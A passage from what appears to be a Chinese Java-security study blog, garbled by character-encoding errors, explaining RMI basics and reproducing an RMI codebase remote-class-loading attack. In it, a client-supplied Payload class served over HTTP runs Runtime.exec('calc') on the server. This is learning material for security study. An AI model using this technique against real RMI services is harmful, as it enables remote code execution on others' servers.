çˆ¶ç±» UnicastRemoteObject çš„æ„é€ å‡½æ•°é‡Œåšäº† socket ç›‘å¬æ“ä½œï¼Œå£°æ˜äº†â€œå¯èƒ½ä¼šæŠ¥é”™â€ã€‚</span><br>    <span class="hljs-comment">//    Java ç¼–è¯‘å™¨å¼ºåˆ¶è§„å®šï¼šå­ç±»åœ¨åˆå§‹åŒ–çˆ¶ç±»ï¼ˆsuper()ï¼‰æ—¶ï¼Œå¿…é¡»å¯¹å¤–å£°æ˜åŒæ ·çš„é£é™©ã€‚</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteHelloWorld</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteHelloWorld</span> &#123;<br>        <br>        <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteHelloWorld</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-built_in">super</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼Œå¼€å¯éšæœºç«¯å£ç›‘å¬ TCP è¿æ¥</span><br>        &#125;<br><br>        <span class="hljs-comment">// å®ç°æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>            <span class="hljs-comment">// è¿™è¡Œä»£ç æ˜¯åœ¨ã€æœåŠ¡ç«¯ã€‘æ‰§è¡Œçš„ï¼Œåªæœ‰æœåŠ¡ç«¯çš„æ§åˆ¶å°ä¼šæ‰“å°</span><br>            System.out.println(<span class="hljs-string">&quot;call from&quot;</span>); <br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello world&quot;</span>; <span class="hljs-comment">// è¿”å›å€¼ä¼šè¢«åºåˆ—åŒ–ï¼Œé€šè¿‡ç½‘ç»œä¼ å›ç»™å®¢æˆ·ç«¯</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// å®ä¾‹åŒ–å¯¹è±¡ã€‚æ³¨æ„ï¼šæ­¤æ—¶å®ƒå·²ç»åœ¨éšæœºç«¯å£ç›‘å¬ TCP è¿æ¥äº†ï¼ˆç­‰å¾…å®¢æˆ·ç«¯çš„ç¬¬äºŒæ¬¡è¿æ¥ï¼‰ã€‚</span><br>        <span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteHelloWorld</span>();<br>        <br>        <span class="hljs-comment">// å¯åŠ¨â€œç”µè¯æŸ¥å·å°â€ï¼ˆRegistryï¼‰ï¼Œç›‘å¬ 1099 ç«¯å£ï¼ˆå®¢æˆ·ç«¯çš„ç¬¬ä¸€æ¬¡è¿æ¥ï¼‰ã€‚</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// ã€é—®é¢˜ 2 è§£ç­”ã€‘ï¼šrebind åªæ˜¯æ³¨å†Œï¼Œæ€ä¹ˆçŸ¥é“è°ƒå“ªä¸ªæ–¹æ³•ï¼Ÿ</span><br>        <span class="hljs-comment">// ç±»æ¯”ï¼šè¿™é‡Œåªæ˜¯åœ¨ç”µè¯é»„é¡µä¸Šç™»è®°ï¼š &quot;Hello&quot; -&gt; &quot;h å¯¹è±¡ (IP:Port)&quot;ã€‚</span><br>        <span class="hljs-comment">// Naming.rebind åªè´Ÿè´£è®©å®¢æˆ·ç«¯èƒ½â€œæ‰¾åˆ°â€è¿™ä¸ªå¯¹è±¡ã€‚</span><br>        <span class="hljs-comment">// è‡³äºå®¢æˆ·ç«¯æ‰¾åˆ°åæ˜¯è°ƒç”¨ hello() è¿˜æ˜¯å…¶ä»–æ–¹æ³•ï¼Œç”±å®¢æˆ·ç«¯ä»£ç å†³å®šã€‚</span><br>        <span class="hljs-comment">// ==========================================</span><br>        Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);<br>    &#125;<br><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-comment">// ã€é—®é¢˜ 4 è§£ç­”ã€‘ï¼šä¸ºä»€ä¹ˆ main å‡½æ•°å®šä¹‰åœ¨ç±»é‡Œé¢ï¼Ÿ</span><br>    <span class="hljs-comment">// Cè¯­è¨€ç±»æ¯”ï¼šJava ä¸å…è®¸å­˜åœ¨è„±ç¦» Class çš„å…¨å±€å‡½æ•°ï¼ˆæ²¡æœ‰ global scopeï¼‰ã€‚</span><br>    <span class="hljs-comment">// æ‰€ä»¥å…¥å£å‡½æ•° main åªèƒ½â€œå¯„ç”Ÿâ€åœ¨æŸä¸ªç±»é‡Œã€‚</span><br>    <span class="hljs-comment">// static æ„å‘³ç€å®ƒå±äºç±»æœ¬èº«ï¼Œä¸ä¾èµ–å¯¹è±¡å®ä¾‹ï¼Œçº¦ç­‰äº C çš„å…¨å±€å‡½æ•°ã€‚</span><br>    <span class="hljs-comment">// ==========================================</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.Train; <span class="hljs-comment">// å‡è®¾åŒ…åä¸º org.vulhub.Train</span><br><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-comment">// ã€é—®é¢˜ 5 è§£ç­”ã€‘ï¼šç°å®åœºæ™¯ä¸­æ€ä¹ˆå¼•å…¥æºç ï¼Ÿ</span><br><span class="hljs-comment">// ç°å®ä¸­ï¼ŒClient å’Œ Server åˆ†ç¦»ï¼ˆç”šè‡³åœ¨ä¸åŒå›½å®¶ï¼‰ã€‚</span><br><span class="hljs-comment">// åšæ³•ï¼šæœåŠ¡ç«¯å¼€å‘è€…ä¼šæŠŠ IRemoteHelloWorld æ¥å£ï¼ˆä¸åŒ…å«å®ç°ç±»ï¼‰ç¼–è¯‘å¹¶æ‰“æˆä¸€ä¸ª .jar åŒ…ã€‚</span><br><span class="hljs-comment">// å®¢æˆ·ç«¯ä¸‹è½½è¿™ä¸ª jar åŒ…ï¼Œimport è¿›æ¥ï¼Œå°±èƒ½é€šè¿‡ç¼–è¯‘äº†ã€‚</span><br><span class="hljs-comment">// è¿™é‡Œå› ä¸ºæ¼”ç¤ºä»£ç åœ¨åŒä¸€ä¸ªå·¥ç¨‹é‡Œï¼Œæ‰€ä»¥ç›´æ¥ import äº†æœåŠ¡ç«¯çš„ç±»ã€‚</span><br><span class="hljs-comment">// ==========================================</span><br><span class="hljs-keyword">import</span> org.vulhub.RMI.RMIServer;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrainMain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// ã€é—®é¢˜ 6 è§£ç­”ã€‘ï¼šä¸ºä»€ä¹ˆæ˜¯å®ç°æ¥å£ï¼Œè€Œä¸æ˜¯å®ä¾‹åŒ–ç±»ï¼Ÿ</span><br>        <span class="hljs-comment">// æ ¸å¿ƒåŸå› ï¼šä½ ä¸èƒ½ new ä¸€ä¸ªåœ¨åˆ«äººç”µè„‘ä¸Šçš„å¯¹è±¡ã€‚</span><br>        <span class="hljs-comment">// Naming.lookup è¿”å›çš„å…¶å®æ˜¯ä¸€ä¸ªâ€œæ›¿èº«â€ï¼ˆStub/ä»£ç†å¯¹è±¡ï¼‰ã€‚</span><br>        <span class="hljs-comment">// è¿™ä¸ªæ›¿èº«åœ¨ç½‘ç»œå±‚é¢ä¼ªè£…æˆäº†æœåŠ¡ç«¯å¯¹è±¡ï¼Œåœ¨ Java è¯­æ³•å±‚é¢å®£ç§°è‡ªå·±å®ç°äº† IRemoteHelloWorld æ¥å£ã€‚</span><br>        <span class="hljs-comment">// æ‰€ä»¥æˆ‘ä»¬å¼ºåˆ¶è½¬æ¢æˆæ¥å£ç±»å‹ (Interface)ï¼Œè€Œä¸æ˜¯å…·ä½“ç±» (Class)ã€‚</span><br>        <span class="hljs-comment">// ==========================================</span><br>        RMIServer.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer.IRemoteHelloWorld) Naming.lookup(<span class="hljs-string">&quot;rmi://192.168.135.142:1099/Hello&quot;</span>);<br>        <br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-comment">// ã€é—®é¢˜ 2 è¡¥å……ã€‘ï¼šæ€ä¹ˆçŸ¥é“è°ƒå“ªä¸ªæ–¹æ³•ï¼Ÿ</span><br>        <span class="hljs-comment">// åœ¨è¿™é‡Œï¼å®¢æˆ·ç«¯æ‹¿åˆ°äº†â€œæ›¿èº«â€ helloï¼Œä»£ç é‡Œæ˜¾å¼å†™äº†è°ƒç”¨ .hello() æ–¹æ³•ã€‚</span><br>        <span class="hljs-comment">// â€œæ›¿èº«â€ä¼šé€šè¿‡ç½‘ç»œæŠŠè¿™ä¸ªè¯·æ±‚ï¼ˆæ–¹æ³•åã€å‚æ•°ï¼‰å‘ç»™æœåŠ¡ç«¯ã€‚</span><br>        <span class="hljs-comment">// ==========================================</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> hello.hello();<br>        <br>        System.out.println(ret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>codebaseï¼š</p><p>codebaseæ˜¯ä¸€ä¸ªåœ°å€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºæˆ‘ä»¬åº”è¯¥ä»å“ªä¸ªåœ°æ–¹å»æœç´¢ç±»ï¼Œä¸CLASSPATHå¾ˆåƒï¼Œä½†æ˜¯CLASSPATHæ˜¯æœ¬åœ°è·¯å¾„ï¼Œè€Œcodebaseé€šå¸¸æ˜¯è¿œç¨‹urlã€‚è‹¥æˆ‘ä»¬æŒ‡å®šcodebase=<a href="http://example.com,ç„¶ååŠ è½½org.test.example.exampleç±»,åˆ™javaè™šæ‹Ÿæœºä¼šä¸‹è½½http//example.com/org/test/example/Example.class%EF%BC%8C%E5%B9%B6%E4%BD%9C%E4%B8%BAExample%E7%B1%BB%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81%E3%80%82">http://example.comï¼Œç„¶ååŠ è½½org.test.example.Exampleç±»ï¼Œåˆ™Javaè™šæ‹Ÿæœºä¼šä¸‹è½½http://example.com/org/test/example/Example.classï¼Œå¹¶ä½œä¸ºExampleç±»çš„å­—èŠ‚ç ã€‚</a></p><p><font style="color:rgb(51,51,51);">RMIçš„æµç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´ä¼ é€’çš„æ˜¯ä¸€äº›åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šå»å¯»æ‰¾ç±»ã€‚å¦‚æœæŸä¸€ç«¯ååºåˆ—åŒ–æ—¶å‘ç°ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¼šå»è‡ªå·±çš„CLASSPATHä¸‹å¯»æ‰¾æƒ³å¯¹åº”çš„ç±»ï¼›å¦‚æœåœ¨æœ¬åœ°æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªç±»ï¼Œå°±ä¼šå»è¿œç¨‹åŠ è½½codebaseä¸­çš„ç±»ã€‚</font></p><h1 id="VnoKI">RMIåˆ©ç”¨</h1>åœ¨RMIä¸­ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶codebaseï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥å»ä»»æ„çš„åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»ä»è€Œå®ç°æˆ‘ä»¬çš„æƒ³æ³•ã€‚<p>ä½†æ˜¯å®˜æ–¹ä¹Ÿæ³¨æ„åˆ°äº†è¿™ä¸ªéšæ‚£ï¼Œæ‰€ä»¥å¦‚æœæƒ³é€šè¿‡codebaseå»åˆ©ç”¨ï¼Œè¿˜éœ€è¦ï¼š</p><ul><li>å®‰è£…å¹¶é…ç½®äº†SecurityManager</li><li>Javaç‰ˆæœ¬ä½äº7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº†java.rmi.server.useCodebaseOnly=false</li></ul><p>è‹¥java.rmi.server.useCodebaseOnlyä¸ºtrueï¼Œåˆ™Javaè™šæ‹Ÿæœºåªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„codebaseï¼Œä¸å†æ”¯æŒä»RMIè¯·æ±‚ä¸­è·å–</p><p>å¤ç°æµç¨‹ï¼š</p><p>é¦–å…ˆæˆ‘çš„ç›®å½•æ˜¯è¿™æ ·çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">rmitest<br>â”œâ”€ .gitignore<br>â”œâ”€ Calc.class<br>â”œâ”€ Calc.java<br>â”œâ”€ client.policy<br>â”œâ”€ ICalc.class<br>â”œâ”€ ICalc.java<br>â”œâ”€ RemoteRMIServer.class<br>â”œâ”€ RemoteRMIServer.java<br>â”œâ”€ RMIClient.java<br>â”œâ”€ rmitest.iml<br>â””â”€ client<br>   â”œâ”€ ICalc.class<br>   â”œâ”€ RMIClient$Payload.class<br>   â””â”€ RMIClient.class<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æ¯ä¸ªæ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">Calc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ICalc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;&#125;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (Integer param : params) &#123;<br>            sum += param;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sum;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ICalc.java<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ICalc</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">sum</span><span class="hljs-params">(List&lt;Integer&gt; params)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">client.policy<br>grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">RemoteRMIServer.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteRMIServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;setup SecurityManager&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.security.policy&quot;</span>,<span class="hljs-string">&quot;D:\\javasec\\javaproject\\rmitest\\client.policy&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.hostname&quot;</span>,<span class="hljs-string">&quot;10.252.92.135&quot;</span>);<br>            System.setProperty(<span class="hljs-string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>,<span class="hljs-string">&quot;false&quot;</span>);<br>            System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityManager</span>());<br>        &#125;<br>        <span class="hljs-type">Calc</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Calc</span>();<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Naming.rebind(<span class="hljs-string">&quot;refObj&quot;</span>, h);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteRMIServer</span>().start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">RMIClient.java<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Payload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt; &#123;<br><br>        <span class="hljs-keyword">static</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Pwned! I am running on Server!&quot;</span>);<br><br>                Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>);<br><br>        <span class="hljs-type">ICalc</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (ICalc)Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/refObj&quot;</span>);<br>        List&lt;Integer&gt; li = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Payload</span>();<br>        li.add(<span class="hljs-number">3</span>);<br>        li.add(<span class="hljs-number">4</span>);<br>        System.out.println(r.sum(li));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIClient</span>().lookup();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨æ ¹ç›®å½•ä¸‹æ‰§è¡Œ<code>javac *.java</code>ç¼–è¯‘æ‰€æœ‰æ–‡ä»¶ï¼Œç¼–è¯‘å¥½äº†ä¹‹åæŒ‰ç…§æˆ‘çš„æ–‡ä»¶æ ‘æ”¾ç½®æ–‡ä»¶ã€‚å…¶å®ä¸»è¦å°±2ç‚¹,<code>RemoteRMIServer.class</code> ç›®å½•ä¸‹æ²¡æœ‰<code>RMIClient.class</code>å’Œ<code>RMIClient$Payload.class</code>ï¼Œç„¶åclientç›®å½•ä¸‹å¾—æœ‰<code>ICalc.class</code>è¿™ä¸ªæ¥å£ç±»ã€‚ç„¶ååœ¨clientä¸‹å¼€å¯webæœåŠ¡ã€‚</p><p>æœåŠ¡ç«¯æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest&gt;java RemoteRMIServer<br>setup SecurityManager<br>Pwned! I am running on Server!<br></code></pre></td></tr></table></figure><p>clientç›®å½•ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;java -Djava.rmi.server.useCodebaseOnly=<span class="hljs-literal">false</span> -Djava.rmi.server.codebase=http:<span class="hljs-comment">//10.252.92.135/ -Djava.security.policy=client.policy RMIClient</span><br>Pwned! I am running on Server!<br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>åŒæ ·çš„clientç›®å½•ä¸‹å¼€å¯webæœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">D:\javasec\javaproject\rmitest\client&gt;python -m http.server <span class="hljs-number">80</span><br>Serving HTTP on :: port <span class="hljs-number">80</span> (http:<span class="hljs-comment">//[::]:80/) ...</span><br>::ffff:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">16</span>/Dec/<span class="hljs-number">2025</span> 09:<span class="hljs-number">19</span>:<span class="hljs-number">10</span>] <span class="hljs-string">&quot;GET /RMIClient$Payload.class HTTP/1.1&quot;</span> <span class="hljs-number">200</span> -<br></code></pre></td></tr></table></figure><p>geminiçš„æŒ‡å¯¼ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848707635-7b554918-7eb5-426c-a320-bcc3a6b2c2c7.png"></p><p>åºåˆ—åŒ–æ•°æ®å¤ç°ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/57713373/1765848445653-abe5f96a-bfb3-49c1-aba8-0f64793ef301.png"></p><p>ç›®å‰è¿˜æ²¡å­¦ä¹ ååºåˆ—åŒ–ï¼Œå°±æ²¡å»å¤ç°äº†ã€‚</p><p>è¡¨è¿°èƒ½åŠ›æœ‰é™ï¼Œå»ºè®®å„ä½è¿˜æ˜¯çœ‹pç¥æ˜Ÿçƒé‡Œçš„pdfã€‚åœ¨pdfä¸­pç¥è¯¦ç»†è®²è¿°äº†RMIä¸­çš„åºåˆ—åŒ–æ•°æ®</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaå®‰å…¨å­¦ä¹ ç¬”è®°1</title>
    <link href="/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <url>/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/</url>
    
